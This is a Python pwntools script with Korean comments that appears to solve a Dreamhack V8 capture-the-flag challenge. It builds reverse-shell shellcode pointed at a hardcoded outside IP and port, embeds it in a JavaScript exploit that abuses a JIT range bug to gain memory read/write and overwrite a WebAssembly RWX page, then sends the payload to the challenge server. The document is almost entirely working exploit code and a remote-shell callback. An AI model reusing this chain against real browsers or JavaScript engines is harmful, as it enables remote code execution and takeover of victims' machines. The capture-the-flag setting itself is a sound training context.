from pwn import *

# 본인의 리버스 셸 수신 IP 및 PORT 입력
YOUR_IP = "13.115.131.56" # 예: "123.456.789.123"
YOUR_PORT = 16619

# 아키텍처 설정
context.arch = 'amd64'
context.os = 'linux'

# 1. Reverse Shell 셸코드 생성
# 서버로 연결한 뒤 /bin/sh 의 입출력을 소켓으로 리다이렉트 (dup2)
print(f"[*] Generating Reverse Shellcode to {YOUR_IP}:{YOUR_PORT}")
shellcode = asm(shellcraft.connect(YOUR_IP, YOUR_PORT) + shellcraft.dupsh())

# 2. 셸코드를 JavaScript의 Uint32Array 형태(4바이트씩)로 변환
if len(shellcode) % 4 != 0:
    shellcode += b'\x90' * (4 - (len(shellcode) % 4)) # NOP padding

sc_array = []
for i in range(0, len(shellcode), 4):
    sc_array.append(hex(u32(shellcode[i:i+4])))

sc_str = "[" + ", ".join(sc_array) + "]"
print(f"[*] Shellcode JS Array: {sc_str}")

# 3. JavaScript 페이로드 구성 (유저 제공 코드 기반)
js_code = f"""
let CONVERSION = new ArrayBuffer(8);
let CONVERSION_U32 = new Uint32Array(CONVERSION);
let CONVERSION_F64 = new Float64Array(CONVERSION);
// 셸코드가 길어질 수 있으므로 ArrayBuffer 크기를 0x1000으로 넉넉히 잡습니다.
let ab = new ArrayBuffer(0x1000); 

let wasm_bytes = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 8, 2, 96, 1, 127, 0, 96, 0, 0, 2, 25, 1, 7, 105, 109, 112, 111, 114, 116, 115, 13, 105, 109, 112, 111, 114, 116, 101, 100, 95, 102, 117, 110, 99, 0, 0, 3, 2, 1, 1, 7, 17, 1, 13, 101, 120, 112, 111, 114, 116, 101, 100, 95, 102, 117, 110, 99, 0, 1, 10, 8, 1, 6, 0, 65, 42, 16, 0, 11]);
let wasm_inst = new WebAssembly.Instance(new WebAssembly.Module(wasm_bytes), {{
  imports: {{
    imported_func: function (x) {{
      return x;
    }},
  }},
}});
let wf = wasm_inst.exports.exported_func;

function tohex64(x) {{
  return "0x" + x[1].toString(16).padStart(8, "0") + x[0].toString(16).padStart(8, "0");
}}
function u32_to_f64(u) {{
  CONVERSION_U32[0] = u[0];
  CONVERSION_U32[1] = u[1];
  return CONVERSION_F64[0];
}}
function f64_to_u32(f, b = 0) {{
  CONVERSION_F64[0] = f;
  if (b) return CONVERSION_U32;
  return new Uint32Array(CONVERSION_U32);
}}
function gc() {{
  for (let i = 0; i < 0x10; i++) new ArrayBuffer(0x800000);
}}

function trigger(a) {{
  let minusZero = -0;
  let p = -0x80000000;
  if (a) {{
    minusZero = -1;
    p = 1;
  }}
  p = minusZero - p;
  p = p + 0;
  p = Math.max(-4, p);
  p = -p;
  p += 1;
  p = Math.max(p, 1);
  p += 1;
  p >>= 1;
  p -= 2;

  let arr = Array(p);
  let arr_two = [1.1, 2.2, 3.3];
  arr.pop();

  return [arr.length, arr, arr_two];
}}

function pwn() {{
  for (let i = 0; i < 0x10000; i++) {{
    trigger(true);
  }}
  gc();

  let a = trigger(false);
  let o = a[1];
  let corrupted_arr = a[2];

  let c = [0.1, 0.2, 0.3, 0.4, 0.5];
  let d = [wf, wf, wf, wf, wf];
  let e = [0.1, 0.2, 0.3, 0.4, 0.5];

  o[16] = 0x100000;

  let ci = 16;
  let di = 29;
  let ei = 41;

  corrupted_arr[ci] = u32_to_f64([0, f64_to_u32(corrupted_arr[di])[0]]);

  function addrOf(o) {{
    d[0] = o;
    return [f64_to_u32(c[0])[0], 0];
  }}
  function read32(o) {{
    o[0] |= 1;
    corrupted_arr[ei] = u32_to_f64([o[0] - 8, o[0] - 8]);
    return [f64_to_u32(e[0])[0], 0];
  }}
  function read64(o) {{
    o[0] |= 1;
    corrupted_arr[ei] = u32_to_f64([o[0] - 8, o[0] - 8]);
    return f64_to_u32(e[0]);
  }}
  function write64(o, v) {{
    o[0] |= 1;
    corrupted_arr[ei] = u32_to_f64([o[0] - 8, o[0] - 8]);
    e[0] = u32_to_f64(v);
  }}

  let wasm_addr = addrOf(wf);
  wasm_addr[0] += 12;
  let tmp = read32(wasm_addr);
  tmp[0] += 4;
  tmp = read32(tmp);
  tmp[0] += 8;
  tmp = read32(tmp);
  tmp[0] += 0x68;
  tmp = read64(tmp);

  let rwx_addr = tmp;
  
  // 파이썬에서 주입한 Reverse Shellcode
  let sc = {sc_str};

  let ab_addr = addrOf(ab);
  let ab_back = ab_addr;
  ab_back[0] += 16 + 4; // backing_store 오프셋

  write64(ab_back, rwx_addr);

  let uu = new Uint32Array(ab);
  for (let i = 0; i < sc.length; i++) {{
    uu[i] = sc[i];
  }}

  // 셸코드 실행
  wf();
}}
pwn();
"""

# 4. 문제 서버 접속 및 전송
# 드림핵 V8 환경은 보통 EOF(파일 전송 끝) 처리를 위해 스크립트를 전송하고 
# 서버쪽에서 실행하도록 하는 입력 형식을 취합니다. 
# (보통 파일 크기를 먼저 보내거나 EOF 마커를 사용합니다)
print("[*] Connecting to target server...")
p = remote('host3.dreamhack.games', 8510)

# (서버의 입력 방식에 따라 아래 전송 코드를 살짝 수정해야 할 수 있습니다.)
# 여기서는 파일 크기를 받고 내용을 전송한다고 가정한 일반적인 V8 CTF 예시입니다.
# 만약 단순 입력 후 EOF 전송 방식이라면 아래 주석의 방식을 사용하세요.

try:
    # 만약 서버가 JS 코드를 입력받고, 특정 문자(예: EOF)를 기다린다면:
    p.send(js_code.encode())
    p.send(b"\nEOF\n") # 드림핵 등에서 종종 사용하는 방식
    
    # 또는 파일 크기를 입력받는다면:
    # p.sendlineafter(b"size: ", str(len(js_code)).encode())
    # p.send(js_code.encode())
    
    print("[+] Exploit sent! Check your netcat listener.")
except Exception as e:
    print(e)

p.interactive()